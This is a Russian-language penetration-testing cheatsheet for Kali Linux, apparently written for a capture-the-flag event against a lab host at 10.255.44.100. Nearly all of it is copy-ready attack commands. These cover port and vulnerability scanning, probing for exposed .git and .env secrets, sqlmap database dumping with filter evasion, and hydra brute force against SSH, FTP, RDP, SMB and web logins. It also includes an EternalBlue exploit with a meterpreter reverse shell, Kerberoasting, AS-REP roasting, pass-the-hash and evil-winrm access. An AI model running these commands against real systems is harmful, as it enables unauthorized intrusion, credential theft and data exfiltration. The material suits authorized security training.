# 🛠️ Cheatsheet: Утилиты пентеста (Kali Linux)

> Все команды готовы к копированию. Сохраните в `~/flags/cheatsheet_tools.md`

---

## 🔍 Nmap — сканирование

### Быстрое обнаружение хостов
```bash
sudo nmap -sn 10.255.44.0/24 -oG hosts.txt
grep "Up" hosts.txt | awk '{print $2}' > targets.txt
```

### Полное сканирование портов (быстро)
```bash
sudo nmap -p- -T4 --min-rate 3000 10.255.44.100 -oA scans/full
```

### Детальное сканирование открытых портов
```bash
sudo nmap -sV -sC -p $(grep open scans/full.gnmap | cut -d' ' -f4 | tr ',' ' ' | sed 's/\/tcp//g') 10.255.44.100 -oA scans/detailed
```

### Специализированные сканирования
```bash
# SMB уязвимости
sudo nmap -p445 --script smb-vuln-* 10.255.44.100 -oA scans/smb

# Веб-уязвимости
sudo nmap -p80,443 --script http-vuln-* 10.255.44.100 -oA scans/web

# Анонимный доступ
sudo nmap -p21,22,80,443,445,389,3306 --script "*anon*" 10.255.44.100 -oA scans/anonymous
```

---

## 🌐 Веб-разведка

### ffuf — directory busting (рекомендуется)
```bash
# Быстрый режим
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.255.44.100/FUZZ -t 100 -c -mc 200,204,301,302,307,403

# С расширениями
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.txt,.html,.bak -u http://10.255.44.100/FUZZ -t 80 -c

# Поиск параметров
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.255.44.100/index.php?FUZZ=test -t 50 -c
```

### gobuster — альтернатива
```bash
gobuster dir -u http://10.255.44.100 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html -t 50
```

### Обязательные проверки (делать ВСЕГДА!)
```bash
curl http://10.255.44.100/robots.txt
curl -s http://10.255.44.100/.git/HEAD && echo "⚠️ .git доступен!"
curl -s http://10.255.44.100/.env | grep -i "pass\|key\|secret"
```

---

## 💉 SQLmap — SQL Injection

### Обнаружение
```bash
sqlmap -u "http://10.255.44.100/login.php?user=admin" --batch --level=5 --risk=3
```

### Извлечение данных
```bash
sqlmap -u "http://10.255.44.100/login.php?user=admin" --dump-all --batch --output-dir=~/flags/sqlmap
sqlmap -u "http://10.255.44.100/login.php?user=admin" -D db -T users --dump --batch
```

### Обход фильтров
```bash
sqlmap -u "http://10.255.44.100/login.php?user=admin" --tamper=space2comment,between --batch
```

---

## 🔑 Hydra — брутфорс

### Подготовка словарей
```bash
cat > ~/flags/users.txt << EOF
admin
administrator
root
user
guest
svc
EOF

cat > ~/flags/passwords.txt << EOF
password
admin
P@ssw0rd
P@ssw0rd2026
reaskills
cyber
EOF
```

### Брутфорс сервисов
```bash
# SSH
hydra -L ~/flags/users.txt -P ~/flags/passwords.txt ssh://10.255.44.100 -t 4 -vV

# FTP
hydra -L ~/flags/users.txt -P ~/flags/passwords.txt ftp://10.255.44.100 -vV

# HTTP POST форма
hydra -L ~/flags/users.txt -P ~/flags/passwords.txt 10.255.44.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -vV

# RDP (Windows)
hydra -L ~/flags/users.txt -P ~/flags/passwords.txt rdp://10.255.44.100 -vV

# SMB
hydra -L ~/flags/users.txt -P ~/flags/passwords.txt smb://10.255.44.100 -vV
```

---

## 📁 SMB — crackmapexec / smbclient

### Анонимный доступ
```bash
smbclient -L //10.255.44.100 -N
crackmapexec smb 10.255.44.100 -u '' -p '' --shares
```

### Перечисление с учётными данными
```bash
crackmapexec smb 10.255.44.100 -u admin -p 'P@ssw0rd2026' --shares --users --sessions
```

### Доступ к шарам
```bash
smbclient //10.255.44.100/share -U admin%P@ssw0rd2026
# Внутри:
ls
get flag.txt
recurse ON
prompt OFF
mget *
```

---

## 🪪 LDAP / FreeIPA

### Анонимный поиск
```bash
ldapsearch -x -h 10.255.44.100 -b "dc=reaskills,dc=cyber" "(objectClass=*)" | tee ldap_anon.txt
ldapsearch -x -h 10.255.44.100 -b "dc=reaskills,dc=cyber" "(uid=*)" cn sn mail
```

### Поиск флагов в атрибутах
```bash
ldapsearch -x -h 10.255.44.100 -b "dc=reaskills,dc=cyber" "(|(description=*RS{*)(comment=*RS{*))" | grep -A3 -B3 "RS{"
```

---

## 💀 Metasploit

### Быстрый старт
```bash
msfconsole -q
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.255.44.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.255.44.1
exploit
```

### Meterpreter — пост-эксплуатация
```bash
sysinfo
getuid
ps
shell
download /path/to/flag.txt
upload /local/script.sh /tmp/
getsystem
run post/multi/recon/local_exploit_suggester
```

---

## 👑 Impacket — AD атаки

### Kerberoasting
```bash
GetUserSPNs.py -dc-ip 10.255.44.100 reaskills.cyber/admin:'P@ssw0rd2026' -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### ASREPRoasting
```bash
GetNPUsers.py reaskills.cyber/ -usersfile users.txt -dc-ip 10.255.44.100 -outputfile asreproast.txt
hashcat -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash
```bash
wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@10.255.44.100 "whoami"
```

---

## 🌐 Другие полезные утилиты

### Nikto — веб-сканер
```bash
nikto -h http://10.255.44.100 -output nikto.txt
```

### WhatWeb — анализ технологий
```bash
whatweb http://10.255.44.100 -v
```

### WAFW00F — обнаружение WAF
```bash
wafw00f http://10.255.44.100
```

### Evil-WinRM — PowerShell шелл для Windows
```bash
evil-winrm -i 10.255.44.100 -u admin -p 'P@ssw0rd2026'
```